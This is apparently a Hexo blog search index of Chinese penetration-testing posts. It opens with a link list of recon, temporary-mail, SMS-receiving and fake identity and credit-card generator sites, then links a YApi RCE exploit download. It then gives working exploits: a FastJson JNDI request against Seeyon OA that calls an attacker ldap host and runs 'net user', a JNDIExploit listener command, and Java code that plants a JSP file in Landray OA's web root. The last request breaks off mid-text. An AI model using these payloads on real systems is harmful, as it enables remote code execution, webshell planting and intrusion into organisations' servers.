<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>在线工具汇总</title>
      <link href="2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"/>
      <url>2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><div class='tip error'><p>信息收集<p></div></h2></li><li><h3 id="信息综合"><a href="#信息综合" class="headerlink" title="信息综合"></a><div class='tip success'><p>信息综合<p></div></h3><h4 id="微步在线"><a href="#微步在线" class="headerlink" title="微步在线"></a><a href="https://x.threatbook.cn/">微步在线</a></h4><h4 id="​RiskIQ"><a href="#​RiskIQ" class="headerlink" title="​RiskIQ"></a><a href="https://community.riskiq.com/home">​RiskIQ</a></h4><h4 id="VirusTotal-线上扫毒"><a href="#VirusTotal-线上扫毒" class="headerlink" title="VirusTotal - 线上扫毒"></a><a href="https://www.virustotal.com/gui/home/url">VirusTotal - 线上扫毒</a></h4></li><li><h3 id="资产测绘搜索"><a href="#资产测绘搜索" class="headerlink" title="资产测绘搜索"></a><div class='tip success'><p>资产测绘搜索<p></div></h3><h4 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google - Hack"></a><a href="https://www.0xll.cc/google_hack.html">Google - Hack</a></h4><h4 id="Google-搜索"><a href="#Google-搜索" class="headerlink" title="Google - 搜索"></a><a href="https://www.google.com/">Google - 搜索</a></h4><h4 id="bing-搜索"><a href="#bing-搜索" class="headerlink" title="bing - 搜索"></a><a href="https://cn.bing.com/">bing - 搜索</a></h4><h4 id="baidu-搜索"><a href="#baidu-搜索" class="headerlink" title="baidu - 搜索"></a><a href="https://www.baidu.com/">baidu - 搜索</a></h4><h4 id="Shodan-网络空间搜索引擎"><a href="#Shodan-网络空间搜索引擎" class="headerlink" title="Shodan - 网络空间搜索引擎"></a><a href="https://www.shodan.io/">Shodan - 网络空间搜索引擎</a></h4><h4 id="Fofa-网络空间安全搜索引擎"><a href="#Fofa-网络空间安全搜索引擎" class="headerlink" title="Fofa - 网络空间安全搜索引擎"></a><a href="https://fofa.so/">Fofa - 网络空间安全搜索引擎</a></h4><h4 id="ZoomEye-钟馗之眼"><a href="#ZoomEye-钟馗之眼" class="headerlink" title="ZoomEye - 钟馗之眼"></a><a href="https://www.zoomeye.org/">ZoomEye - 钟馗之眼</a></h4></li><li><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a><div class='tip success'><p>指纹识别<p></div></h3><h4 id="网站基础信息获取-ThreatScan"><a href="#网站基础信息获取-ThreatScan" class="headerlink" title="网站基础信息获取 - ThreatScan"></a><a href="https://scan.top15.cn/web/">网站基础信息获取 - ThreatScan</a></h4><h4 id="云悉互联网WEB资产在线梳理-在线CMS指纹识别平台"><a href="#云悉互联网WEB资产在线梳理-在线CMS指纹识别平台" class="headerlink" title="云悉互联网WEB资产在线梳理|在线CMS指纹识别平台"></a><a href="http://www.yunsee.cn/">云悉互联网WEB资产在线梳理|在线CMS指纹识别平台</a></h4><h4 id="在线指纹识别-在线cms识别小插件–在线工具"><a href="#在线指纹识别-在线cms识别小插件–在线工具" class="headerlink" title="在线指纹识别,在线cms识别小插件–在线工具"></a><a href="http://whatweb.bugscaner.com/look/">在线指纹识别,在线cms识别小插件–在线工具</a></h4></li><li><h3 id="子域名-解析历史-旁站-c段"><a href="#子域名-解析历史-旁站-c段" class="headerlink" title="子域名/解析历史/旁站/c段/"></a><div class='tip success'><p>子域名/解析历史/旁站/c段/<p></div></h3><h4 id="w-e-b-site-子域名搜索"><a href="#w-e-b-site-子域名搜索" class="headerlink" title="w-e-b.site -子域名搜索"></a><a href="https://w-e-b.site/?act=findomain">w-e-b.site -子域名搜索</a></h4><h4 id="phpinfo-me-子域名在线爆破"><a href="#phpinfo-me-子域名在线爆破" class="headerlink" title="phpinfo.me - 子域名在线爆破"></a><a href="https://phpinfo.me/domain/">phpinfo.me - 子域名在线爆破</a></h4><h4 id="子成君子域名在线爆破"><a href="#子成君子域名在线爆破" class="headerlink" title="子成君子域名在线爆破"></a><a href="http://z.zcjun.com/">子成君子域名在线爆破</a></h4><h4 id="DNSDB-dns解析历史"><a href="#DNSDB-dns解析历史" class="headerlink" title="DNSDB - dns解析历史"></a><a href="https://dnsdb.io/zh-cn/">DNSDB - dns解析历史</a></h4><h4 id="DNSlytics-域名综合信息查询"><a href="#DNSlytics-域名综合信息查询" class="headerlink" title=" DNSlytics - 域名综合信息查询"></a><a href="https://dnslytics.com/"> DNSlytics - 域名综合信息查询</a></h4><h4 id="securitytrails-域名综合信息查询"><a href="#securitytrails-域名综合信息查询" class="headerlink" title="securitytrails - 域名综合信息查询"></a><a href="https://securitytrails.com/">securitytrails - 域名综合信息查询</a></h4><h4 id="google-https证书透明度报告查询-需翻墙"><a href="#google-https证书透明度报告查询-需翻墙" class="headerlink" title="google https证书透明度报告查询 需翻墙"></a><a href="hhttps://transparencyreport.google.com/https/certificates">google https证书透明度报告查询 需翻墙</a></h4><h4 id="DNSdumpster-域名综合信息查询"><a href="#DNSdumpster-域名综合信息查询" class="headerlink" title="DNSdumpster - 域名综合信息查询"></a><a href="https://dnsdumpster.com/">DNSdumpster - 域名综合信息查询</a></h4><h4 id="Netcraft-域名综合信息查询"><a href="#Netcraft-域名综合信息查询" class="headerlink" title="Netcraft - 域名综合信息查询"></a><a href="https://sitereport.netcraft.com/">Netcraft - 域名综合信息查询</a></h4><h4 id="crt-sh-通过证书搜索域名信息"><a href="#crt-sh-通过证书搜索域名信息" class="headerlink" title="crt.sh - 通过证书搜索域名信息"></a><a href="https://crt.sh/">crt.sh - 通过证书搜索域名信息</a></h4><h4 id="ip138-域名ip-ip域名"><a href="#ip138-域名ip-ip域名" class="headerlink" title="ip138 域名ip-ip域名"></a><a href="https://site.ip138.com/">ip138 域名ip-ip域名</a></h4><h4 id="站长之家ip综合查询"><a href="#站长之家ip综合查询" class="headerlink" title="站长之家ip综合查询"></a><a href="http://ip.tool.chinaz.com/">站长之家ip综合查询</a></h4><h4 id="多功能信息搜索"><a href="#多功能信息搜索" class="headerlink" title="多功能信息搜索"></a><a href="https://censys.io/certificates">多功能信息搜索</a></h4><h4 id="域名IP查询-可批量查询"><a href="#域名IP查询-可批量查询" class="headerlink" title="域名IP查询 可批量查询"></a><a href="http://www.link114.cn/ip/">域名IP查询 可批量查询</a></h4><h4 id="CloudFlare-cnd数据库"><a href="#CloudFlare-cnd数据库" class="headerlink" title="CloudFlare cnd数据库"></a><a href="http://www.crimeflare.org:82/cfs.html">CloudFlare cnd数据库</a></h4></li><li><h3 id="whois-在线查询"><a href="#whois-在线查询" class="headerlink" title="whois 在线查询"></a><div class='tip success'><p>whois 在线查询<p></div></h3><h4 id="中国互联网信息中心-whois查询"><a href="#中国互联网信息中心-whois查询" class="headerlink" title="中国互联网信息中心 whois查询"></a><a href="https://whois.cnnic.cn/WelcomeServlet">中国互联网信息中心 whois查询</a></h4><h4 id="中国互联网信息中心-whois查询-2"><a href="#中国互联网信息中心-whois查询-2" class="headerlink" title="中国互联网信息中心 whois查询 2"></a><a href="http://ipwhois.cnnic.net.cn/">中国互联网信息中心 whois查询 2</a></h4><h4 id="爱特-whois查询"><a href="#爱特-whois查询" class="headerlink" title="爱特 whois查询"></a><a href="https://whois.aite.xyz/">爱特 whois查询</a></h4><h4 id="who-is-whois查询"><a href="#who-is-whois查询" class="headerlink" title="who.is whois查询"></a><a href="https://who.is/">who.is whois查询</a></h4><h4 id="domaintools-whois查询"><a href="#domaintools-whois查询" class="headerlink" title="domaintools whois查询"></a><a href="https://whois.domaintools.com/">domaintools whois查询</a></h4></li><li><h3 id="邮箱信息收集"><a href="#邮箱信息收集" class="headerlink" title="邮箱信息收集"></a><div class='tip success'><p>邮箱信息收集<p></div></h3><h4 id="搜邮箱-邮箱信息搜索"><a href="#搜邮箱-邮箱信息搜索" class="headerlink" title="搜邮箱 邮箱信息搜索"></a><a href="https://souyouxiang.com/">搜邮箱 邮箱信息搜索</a></h4><h4 id="微匹-邮箱信息查询"><a href="#微匹-邮箱信息查询" class="headerlink" title="微匹 邮箱信息查询"></a><a href="http://veryvp.com/Official/Index">微匹 邮箱信息查询</a></h4><h4 id="Hunter-邮箱信息搜索系统"><a href="#Hunter-邮箱信息搜索系统" class="headerlink" title="Hunter 邮箱信息搜索系统"></a><a href="https://hunter.io/search/">Hunter 邮箱信息搜索系统</a></h4><h4 id="skymem-邮箱信息搜索系统"><a href="#skymem-邮箱信息搜索系统" class="headerlink" title="skymem 邮箱信息搜索系统"></a><a href="https://www.skymem.info/">skymem 邮箱信息搜索系统</a></h4></li><li><h3 id="在线端口扫描工具"><a href="#在线端口扫描工具" class="headerlink" title="在线端口扫描工具"></a><div class='tip success'><p>在线端口扫描工具<p></div></h3><h4 id="hackertarget-Nmap在线扫描"><a href="#hackertarget-Nmap在线扫描" class="headerlink" title="hackertarget Nmap在线扫描"></a><a href="https://hackertarget.com/nmap-online-port-scanner/">hackertarget Nmap在线扫描</a></h4><h4 id="Nmap在线扫描"><a href="#Nmap在线扫描" class="headerlink" title="Nmap在线扫描"></a><a href="https://nmap.online/">Nmap在线扫描</a></h4><h4 id="w-e-b-site-在线扫描"><a href="#w-e-b-site-在线扫描" class="headerlink" title="w-e-b.site 在线扫描"></a><a href="https://nmap.online/">w-e-b.site 在线扫描</a></h4></li><li><h3 id="小工具"><a href="#小工具" class="headerlink" title="小工具"></a><div class='tip success'><p>小工具<p></div></h3><h4 id="桔子SEO工具-一键提取url"><a href="#桔子SEO工具-一键提取url" class="headerlink" title="桔子SEO工具 一键提取url"></a><a href="https://seo.juziseo.com/tools/domain/">桔子SEO工具 一键提取url</a></h4><h4 id="搜收录网-批量查询网站标题"><a href="#搜收录网-批量查询网站标题" class="headerlink" title="搜收录网 - 批量查询网站标题 "></a><a href="https://seo.juziseo.com/tools/domain/">搜收录网 - 批量查询网站标题 </a></h4></li><li><h2 id="收发验证码服务-匿名邮箱-身份信息生成"><a href="#收发验证码服务-匿名邮箱-身份信息生成" class="headerlink" title="收发验证码服务-匿名邮箱-身份信息生成"></a><div class='tip error'><p>收发验证码服务-匿名邮箱-身份信息生成<p></div></h2></li><li><h3 id="收发验证码服务"><a href="#收发验证码服务" class="headerlink" title="收发验证码服务"></a><div class='tip success'><p>收发验证码服务<p></div></h3><h4 id="zusms-免费在线手机短信验证码"><a href="#zusms-免费在线手机短信验证码" class="headerlink" title="zusms - 免费在线手机短信验证码 "></a><a href="https://www.zusms.com/">zusms - 免费在线手机短信验证码 </a></h4><h4 id="shejiinn-免费在线手机短信验证码"><a href="#shejiinn-免费在线手机短信验证码" class="headerlink" title="shejiinn - 免费在线手机短信验证码"></a><a href="http://www.shejiinn.com/">shejiinn - 免费在线手机短信验证码</a></h4><h4 id="Z-SMS-免费在线手机短信验证码"><a href="#Z-SMS-免费在线手机短信验证码" class="headerlink" title="Z-SMS - 免费在线手机短信验证码"></a><a href="http://www.shejiinn.com/">Z-SMS - 免费在线手机短信验证码</a></h4><h4 id="materialtools-在线短信接收"><a href="#materialtools-在线短信接收" class="headerlink" title="materialtools - 在线短信接收"></a><a href="https://www.materialtools.com/?page=1">materialtools - 在线短信接收</a></h4><h4 id="yunduanxin-在线接收手机短信验证码"><a href="#yunduanxin-在线接收手机短信验证码" class="headerlink" title="yunduanxin - 在线接收手机短信验证码"></a><a href="https://yunduanxin.net/">yunduanxin - 在线接收手机短信验证码</a></h4><h4 id="ReceiveFreeSMS-各国各地区手机在线接收验证码"><a href="#ReceiveFreeSMS-各国各地区手机在线接收验证码" class="headerlink" title="ReceiveFreeSMS - 各国各地区手机在线接收验证码"></a><a href="http://receivefreesms.com/">ReceiveFreeSMS - 各国各地区手机在线接收验证码</a></h4><h4 id="ReceiveFreeSMS-美国加拿大-地区手机接收验证码"><a href="#ReceiveFreeSMS-美国加拿大-地区手机接收验证码" class="headerlink" title="ReceiveFreeSMS - 美国加拿大 地区手机接收验证码"></a><a href="https://receivefreesms.net/">ReceiveFreeSMS - 美国加拿大 地区手机接收验证码</a></h4><h4 id="sellaite-爱沙尼亚-地区手机接收验证码"><a href="#sellaite-爱沙尼亚-地区手机接收验证码" class="headerlink" title="sellaite - 爱沙尼亚 地区手机接收验证码"></a><a href="http://sms.sellaite.com/">sellaite - 爱沙尼亚 地区手机接收验证码</a></h4><h4 id="freephonenum-在线接收短信-支持发送短信！"><a href="#freephonenum-在线接收短信-支持发送短信！" class="headerlink" title="freephonenum - 在线接收短信  |支持发送短信！|"></a><a href="https://ch.freephonenum.com/">freephonenum - 在线接收短信  |支持发送短信！|</a></h4><h4 id="receiveasms-在线接收短信-国外号码"><a href="#receiveasms-在线接收短信-国外号码" class="headerlink" title="receiveasms - 在线接收短信  |国外号码|"></a><a href="https://receiveasms.com/">receiveasms - 在线接收短信  |国外号码|</a></h4><h4 id="receive-sms-在线接收短信-国外号码"><a href="#receive-sms-在线接收短信-国外号码" class="headerlink" title="receive-sms - 在线接收短信  |国外号码|"></a><a href="https://receive-sms.com/">receive-sms - 在线接收短信  |国外号码|</a></h4></li><li><h3 id="临时，匿名邮箱服务"><a href="#临时，匿名邮箱服务" class="headerlink" title="临时，匿名邮箱服务"></a><div class='tip success'><p>临时，匿名邮箱服务<p></div></h3><h4 id="ProtonMail-可完全匿名注册的邮箱"><a href="#ProtonMail-可完全匿名注册的邮箱" class="headerlink" title="ProtonMail |可完全匿名注册的邮箱|"></a><a href="https://protonmail.com/">ProtonMail |可完全匿名注册的邮箱|</a></h4><h4 id="临时邮箱、临时邮、临时电子邮箱、24小时邮箱"><a href="#临时邮箱、临时邮、临时电子邮箱、24小时邮箱" class="headerlink" title="临时邮箱、临时邮、临时电子邮箱、24小时邮箱"></a><a href="http://24mail.chacuo.net/">临时邮箱、临时邮、临时电子邮箱、24小时邮箱</a></h4><h4 id="YOPmail-临时、匿名的免费邮箱地址。"><a href="#YOPmail-临时、匿名的免费邮箱地址。" class="headerlink" title="YOPmail : 临时、匿名的免费邮箱地址。"></a><a href="http://www.yopmail.com/">YOPmail : 临时、匿名的免费邮箱地址。</a></h4><h4 id="临时邮箱-十秒钟内收到邮件"><a href="#临时邮箱-十秒钟内收到邮件" class="headerlink" title="临时邮箱 - 十秒钟内收到邮件"></a><a href="https://www.linshiyouxiang.net">临时邮箱 - 十秒钟内收到邮件</a></h4><h4 id="10分钟邮箱"><a href="#10分钟邮箱" class="headerlink" title="10分钟邮箱"></a><a href="https://10minutemail.net">10分钟邮箱</a></h4><h4 id="moakt临时邮箱"><a href="#moakt临时邮箱" class="headerlink" title="moakt临时邮箱"></a><a href="https://www.moakt.com">moakt临时邮箱</a></h4><h4 id="TEMPmail-临时邮箱"><a href="#TEMPmail-临时邮箱" class="headerlink" title="TEMPmail 临时邮箱"></a><a href="https://temp-mail.org">TEMPmail 临时邮箱</a></h4><h4 id="FAKE-E-MAIL-临时邮箱"><a href="#FAKE-E-MAIL-临时邮箱" class="headerlink" title="FAKE E-MAIL 临时邮箱"></a><a href="http://www.fakemailgenerator.com">FAKE E-MAIL 临时邮箱</a></h4><h4 id="nada-临时邮箱"><a href="#nada-临时邮箱" class="headerlink" title="nada 临时邮箱"></a><a href="https://getnada.com">nada 临时邮箱</a></h4><h4 id="tempmail-临时邮箱"><a href="#tempmail-临时邮箱" class="headerlink" title="tempmail 临时邮箱"></a><a href="https://tempmail.net">tempmail 临时邮箱</a></h4><h4 id="✉-Guerrilla-Mail-临时邮箱"><a href="#✉-Guerrilla-Mail-临时邮箱" class="headerlink" title="✉ Guerrilla Mail 临时邮箱"></a><a href="https://www.guerrillamail.com/">✉ Guerrilla Mail 临时邮箱</a></h4></li><li><h3 id="个人身份信息生成"><a href="#个人身份信息生成" class="headerlink" title="个人身份信息生成"></a><div class='tip success'><p>个人身份信息生成<p></div></h3><h4 id="美国身份证生成，美国人地址信息生成"><a href="#美国身份证生成，美国人地址信息生成" class="headerlink" title="美国身份证生成，美国人地址信息生成"></a><a href="http://shenfendaquan.com/">美国身份证生成，美国人地址信息生成</a></h4><h4 id="美国地址生成，美国人虚构信息生成-世界各国虚拟身份信息、地址、信用卡生成"><a href="#美国地址生成，美国人虚构信息生成-世界各国虚拟身份信息、地址、信用卡生成" class="headerlink" title="美国地址生成，美国人虚构信息生成-世界各国虚拟身份信息、地址、信用卡生成"></a><a href="http://www.haoweichi.com/">美国地址生成，美国人虚构信息生成-世界各国虚拟身份信息、地址、信用卡生成</a></h4><h4 id="Fake-Name-Generator-个人信息生成"><a href="#Fake-Name-Generator-个人信息生成" class="headerlink" title="Fake Name Generator 个人信息生成"></a><a href="https://www.fakenamegenerator.com/">Fake Name Generator 个人信息生成</a></h4></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 在线工具汇总 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 在线工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>YApi rce工具</title>
      <link href="2021/07/10/YAIP-rce%E5%B7%A5%E5%85%B7/"/>
      <url>2021/07/10/YAIP-rce%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="YApi-rce-小工具"><a href="#YApi-rce-小工具" class="headerlink" title="YApi rce 小工具"></a>YApi rce 小工具</h3><h3 id="我大哥的博客"><a href="#我大哥的博客" class="headerlink" title="我大哥的博客"></a><a href="https://snowlovely.live/">我大哥的博客</a></h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/YApii1.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/YApii2.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/YApii3.webp" alt="image"></p><h4 id="YApiExploit下载地址"><a href="#YApiExploit下载地址" class="headerlink" title="YApiExploit下载地址"></a><a href="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/YApiExploit.zip">YApiExploit下载地址</a></h4><h3 id="不贴复现截图了"><a href="#不贴复现截图了" class="headerlink" title="不贴复现截图了"></a>不贴复现截图了</h3><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><pre><code>https://www.o2oxy.cn/3611.htmlhttps://fndxkl1.github.io/2021/07/08/YApi-RCE/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> YApi </tag>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>致远OA FastJson rce回显</title>
      <link href="2021/06/29/%E8%87%B4%E8%BF%9COA-FastJson-rce%E5%9B%9E%E6%98%BE/"/>
      <url>2021/06/29/%E8%87%B4%E8%BF%9COA-FastJson-rce%E5%9B%9E%E6%98%BE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自行搭建环境"><a href="#自行搭建环境" class="headerlink" title="自行搭建环境"></a>自行搭建环境</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/pasted-12.png" alt="upload successful"></p><h3 id="漏洞路径"><a href="#漏洞路径" class="headerlink" title="漏洞路径"></a>漏洞路径</h3><pre><code>/seeyon/main.do?method=changeLocale</code></pre><h3 id="构造利用数据包"><a href="#构造利用数据包" class="headerlink" title="构造利用数据包"></a>构造利用数据包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;main.do?method&#x3D;changeLocale HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">cmd: net user</span><br><span class="line">Content-Length: 713</span><br><span class="line"></span><br><span class="line">_json_params&#x3D;&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;,&quot;\u0076\u0061\u006c&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;:&quot;ldap:&#x2F;&#x2F;xx.xx.xx.xx&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/pasted-13.png" alt="upload successful"></p><h3 id="命令回显"><a href="#命令回显" class="headerlink" title="命令回显"></a>命令回显</h3><p>利用feihong大佬的利用工具直接进行回显</p><h4 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h4><pre><code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -p 7743 -i xx.xx.xx.xx</code></pre><p><img src= "/img/loading.gif" data-lazy-src="/images/pasted-14.png" alt="upload successful"></p><h4 id="直接使用tomcatecho-进行回显"><a href="#直接使用tomcatecho-进行回显" class="headerlink" title="直接使用tomcatecho 进行回显"></a>直接使用tomcatecho 进行回显</h4><p><img src= "/img/loading.gif" data-lazy-src="/images/pasted-15.png" alt="upload successful"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 致远oa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝凌OA XmlDecoder getshell</title>
      <link href="2021/06/29/%E8%93%9D%E5%87%8COA-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getshell/"/>
      <url>2021/06/29/%E8%93%9D%E5%87%8COA-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getshell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="自行搭建环境："><a href="#自行搭建环境：" class="headerlink" title="自行搭建环境："></a>自行搭建环境：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8Cxml6.webp" alt="image"></p><h4 id="生成Bcel代码"><a href="#生成Bcel代码" class="headerlink" title="生成Bcel代码"></a>生成Bcel代码</h4><p>蓝凌默认jdk环境为jdk7，本地编译等操作注意要使用jdk7<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8Cxml5.webp" alt="image"></p><p>修改代码参数示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import java.io.PrintWriter;</span><br><span class="line">import sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line">public class FastJsonEchoBCEL &#123;</span><br><span class="line">    public FastJsonEchoBCEL() throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        new FastJsonEchoBCEL();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class cls&#x3D;Thread.currentThread().getContextClassLoader().loadClass(&quot;bsh.Interpreter&quot;);</span><br><span class="line">            String path&#x3D;cls.getProtectionDomain().getCodeSource().getLocation().getPath();</span><br><span class="line">            PrintWriter printWriter2 &#x3D; new PrintWriter(path.split(&quot;WEB-INF&quot;)[0] + &quot;login_list.jsp&quot;);</span><br><span class="line">            String shell &#x3D; &quot;PCVvdXQucHJpbnRsbigic2hlbGx0ZXN0Iik7JT4&#x3D;&quot;;</span><br><span class="line">            BASE64Decoder decoder &#x3D; new BASE64Decoder();</span><br><span class="line">            String decodeString &#x3D; new String(decoder.decodeBuffer(shell), &quot;UTF-8&quot;);</span><br><span class="line">            printWriter2.println(decodeString);</span><br><span class="line">            printWriter2.close();</span><br><span class="line">        &#125; catch (Exception var5) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8Cxml4.webp" alt="image"></p><p>生成Bcel</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.bcel.Repository;</span><br><span class="line">import org.apache.bcel.classfile.JavaClass;</span><br><span class="line">import org.apache.bcel.classfile.Utility;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, IOException &#123;</span><br><span class="line">        JavaClass javaClass &#x3D; Repository.lookupClass(FastJsonEchoBCEL.class);</span><br><span class="line">        String codes &#x3D; Utility.encode(javaClass.getBytes(), true);</span><br><span class="line">        System.out.println(&quot;$$BCEL$$&quot;+codes);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8Cxml3.webp" alt="image"></p><p>代码来源于print(“”)大佬<br><a href="https://www.o2oxy.cn/3494.html">https://www.o2oxy.cn/3494.html</a></p><h4 id="构造利用数据包"><a href="#构造利用数据包" class="headerlink" title="构造利用数据包"></a>构造利用数据包</h4><p>数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;sys&#x2F;ui&#x2F;extend&#x2F;varkind&#x2F;custom.jsp HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8080</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-cn</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 2779</span><br><span class="line"></span><br><span 